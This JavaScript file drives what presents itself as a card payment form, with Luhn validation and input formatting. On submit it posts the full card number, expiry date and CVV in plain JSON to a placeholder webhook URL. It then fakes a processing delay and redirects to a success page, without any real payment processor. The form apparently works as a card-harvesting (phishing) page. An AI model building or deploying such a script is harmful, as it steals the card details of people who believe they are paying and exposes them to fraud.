// Luhn algorithm for card validation
function luhnCheck(cardNumber) {
    const digits = cardNumber.replace(/\D/g, '');
    let sum = 0;
    let isEven = false;

    for (let i = digits.length - 1; i >= 0; i--) {
        let digit = parseInt(digits[i]);

        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }

        sum += digit;
        isEven = !isEven;
    }

    return sum % 10 === 0;
}

// Format card number with spaces
function formatCardNumber(input) {
    const value = input.value.replace(/\D/g, '');
    input.value = value;
}

// Format expiry date
function formatExpiryDate(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.slice(0, 2) + '/' + value.slice(2);
    }
    input.value = value;
}

// Show error message
function showError(message) {
    const errorElement = document.getElementById('errorMessage');
    errorElement.textContent = message;
    errorElement.classList.add('show');
}

// Hide error message
function hideError() {
    const errorElement = document.getElementById('errorMessage');
    errorElement.classList.remove('show');
}

// Send payment data to webhook
async function sendPaymentWebhook(data) {
    const WEBHOOK_URL = 'YOUR_WEBHOOK_URL'; // Replace with your webhook URL
    
    const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    });

    if (!response.ok) {
        throw new Error('Payment verification failed');
    }

    return response;
}

// Form submission handler
document.getElementById('paymentForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    hideError();

    const cardNumber = document.getElementById('cardNumber').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;
    const submitButton = document.getElementById('submitButton');

    if (!luhnCheck(cardNumber)) {
        showError('Invalid card number');
        return;
    }

    submitButton.classList.add('loading');

    try {
        await sendPaymentWebhook({
            cardNumber,
            expiryDate: expiry,
            cvv
        });

        // Simulate processing time
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Redirect to success page
        window.location.href = '/success.html';
    } catch (err) {
        showError('Payment verification failed. Please try again.');
    } finally {
        submitButton.classList.remove('loading');
    }
});

// Input formatting
document.getElementById('cardNumber').addEventListener('input', (e) => formatCardNumber(e.target));
document.getElementById('expiry').addEventListener('input', (e) => formatExpiryDate(e.target));
document.getElementById('cvv').addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
});